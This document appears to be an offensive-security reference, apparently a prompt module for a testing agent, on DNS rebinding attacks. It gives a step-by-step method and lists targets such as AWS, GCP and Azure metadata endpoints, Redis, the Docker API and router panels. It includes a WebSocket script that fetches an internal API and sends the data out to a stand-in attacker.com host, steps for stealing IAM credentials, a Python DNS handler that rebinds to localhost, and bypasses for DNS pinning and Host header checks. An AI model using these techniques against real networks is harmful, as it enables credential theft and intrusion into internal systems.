<dns_rebinding_guide>
<title>DNS REBINDING ATTACKS</title>

<critical>DNS rebinding exploits browser Same-Origin Policy by changing DNS resolution between requests. Initially points to attacker server, then rebinds to internal/localhost targets. Enables access to cloud metadata (169.254.169.254), internal services, IoT devices, and bypasses firewall restrictions. Focus on time-based rebinding, multiple A records, and WebSocket abuse.</critical>

<scope>
- Internal service access via rebinding (localhost, RFC1918, link-local)
- Cloud metadata endpoint access (AWS, GCP, Azure)
- Router/IoT admin panel exploitation
- WebSocket DNS rebinding for persistent connections
- Browser DNS cache exploitation
- Multiple A record race conditions
- Time-based TTL manipulation
- CORS bypass via origin confusion
</scope>

<methodology>
1. Identify targets: localhost services, internal IPs, cloud metadata, routers
2. Setup DNS server with low TTL (0-1 seconds) returning attacker IP first
3. Load attacker page, establish connection, perform CSRF/token collection
4. DNS rebinds to target IP (127.0.0.1, 192.168.x.x, 169.254.169.254)
5. Make requests from browser—now same-origin as target
6. Exfiltrate data to attacker server before DNS rebinds again
7. Use WebSocket for persistent connection across rebinding
</methodology>

<attack_vectors>
<time_based_rebinding>
- DNS record with TTL=0 or very low (1-5 seconds)
- First resolution: attacker-controlled IP (203.0.113.1)
- Wait for browser to establish session, execute JS
- After delay: DNS updates to target IP (127.0.0.1)
- Subsequent requests resolve to target
- Browser thinks same origin (same domain name)

Example flow:
1. Victim visits attacker.com (resolves to 203.0.113.1)
2. Loads malicious JS from attacker server
3. JS makes fetch() to http://attacker.com:8080
4. DNS rebinds: attacker.com now resolves to 127.0.0.1
5. Browser makes request to http://127.0.0.1:8080 (bypassing SOP)
</time_based_rebinding>

<multiple_a_records>
- DNS returns multiple A records in single response
- First record: attacker IP (public)
- Second record: target IP (internal)
- Browser/OS may round-robin or randomly choose
- Race condition: some requests hit attacker, some hit target
- Retry logic eventually hits target IP

Example:
attacker.com IN A 203.0.113.1
attacker.com IN A 127.0.0.1
attacker.com IN A 192.168.1.1

Browser randomly selects, creates opportunity for rebinding
</multiple_a_records>

<pin_and_rebind>
- Establish connection to attacker server
- Collect session token, CSRF token, nonce
- Store in localStorage/sessionStorage
- Trigger DNS rebind to target
- Replay tokens to target (same origin now)
- Useful for authenticated internal services
</pin_and_rebind>
</attack_vectors>

<target_scenarios>
<cloud_metadata>
<aws_imds>
- Target: http://169.254.169.254/latest/meta-data/
- Goal: steal IAM credentials from /iam/security-credentials/{role}
- Payload:
  1. Rebind attacker.com → 169.254.169.254
  2. fetch('http://attacker.com/latest/meta-data/iam/security-credentials/')
  3. Exfiltrate credentials to attacker

Bypass IMDSv2 (requires PUT for token):
- Limited by browser fetch() API
- WebSocket may allow custom methods
- Some browsers/libraries allow PUT via fetch()
</aws_imds>

<gcp_metadata>
- Target: http://metadata.google.internal/computeMetadata/v1/
- Requires header: Metadata-Flavor: Google
- Rebinding challenge: custom header in fetch()
- Possible if target reflects headers or has CORS misconfiguration
</gcp_metadata>

<azure_metadata>
- Target: http://169.254.169.254/metadata/instance?api-version=2021-02-01
- Requires header: Metadata: true
- Similar header challenge as GCP
</azure_metadata>
</cloud_metadata>

<internal_services>
- Redis (6379): HTTP requests may be interpreted as commands
- Elasticsearch (9200): REST API accessible
- Docker API (2375): Container management
- Jenkins, Grafana, internal dashboards
- Corporate intranet sites
- Development servers, staging environments
</internal_services>

<localhost_applications>
- Local web servers (dev environments)
- Desktop applications with HTTP APIs (Electron apps)
- Browser extensions with local servers
- Mobile debugging interfaces
- Local databases with HTTP interfaces
</localhost_applications>

<iot_devices>
- Router admin panels (192.168.0.1, 192.168.1.1)
- Smart home devices
- IP cameras
- Network printers
- Default credentials often present
</iot_devices>
</target_scenarios>

<browser_specific_techniques>
<dns_cache_exploitation>
- Browsers cache DNS independently of OS
- Chrome: up to 60 seconds default
- Firefox: respects TTL but min ~1 second
- Safari: respects system cache

Exploit:
- Set low TTL (0-1s)
- Rapidly make requests to trigger cache refresh
- Race condition between cache expiry and rebind
</dns_cache_exploitation>

<websocket_rebinding>
- WebSocket connections persist across DNS changes
- Establish WebSocket to attacker server
- DNS rebinds to target
- New WebSocket connections go to target
- Existing connection to attacker remains (for exfiltration)

Example:
ws = new WebSocket('ws://attacker.com:8080');
ws.onopen = () => {
  // Wait for rebind
  setTimeout(() => {
    fetch('http://attacker.com/internal-api')
      .then(r => r.text())
      .then(data => ws.send(data)); // exfil via existing WS
  }, 5000);
};
</websocket_rebinding>

<iframe_rebinding>
- Load attacker page in iframe
- Parent page and iframe share origin after rebind
- Cross-frame communication becomes same-origin
- Bypass iframe sandbox restrictions
</iframe_rebinding>
</browser_specific_techniques>

<dns_server_requirements>
<dynamic_dns>
- Authoritative DNS server with programmatic control
- Python dnslib, PowerDNS with API, custom NS server
- Return different IPs based on query count, time, source IP

Example (Python):
class RebindHandler:
    def __init__(self):
        self.queries = {}
    
    def resolve(self, domain, source_ip):
        if self.queries.get(source_ip, 0) < 3:
            self.queries[source_ip] = self.queries.get(source_ip, 0) + 1
            return '203.0.113.1'  # attacker IP
        else:
            return '127.0.0.1'  # target IP
</dynamic_dns>

<ttl_manipulation>
- TTL=0 for immediate expiry
- TTL=1 for rapid rebinding
- Some resolvers ignore TTL=0, use TTL=1 minimum
- Chrome respects TTL but caches for minimum ~1s
</ttl_manipulation>

<wildcard_dns>
- *.attacker.com returns controlled IPs
- Use subdomains to isolate attacks:
  - victim1.attacker.com → 192.168.1.1
  - victim2.attacker.com → 127.0.0.1
- Allows per-target rebinding configuration
</wildcard_dns>
</dns_server_requirements>

<defenses_and_bypasses>
<dns_pinning>
- Browsers pin DNS for connection duration
- Bypass: close connection, wait for pin to expire
- New connection triggers new DNS lookup
- Force connection close via HTTP/1.0 or Connection: close
</dns_pinning>

<host_header_validation>
- Servers check Host header against whitelist
- Bypass: use IP address in URL, Host header intact
- Or: find server that doesn't validate Host
</host_header_validation>

<authentication_tokens>
- Internal services may require auth
- Steal tokens via initial phase (before rebind)
- CSRF tokens, session cookies, JWT
- Replay after rebinding to target
</authentication_tokens>
</defenses_and_bypasses>

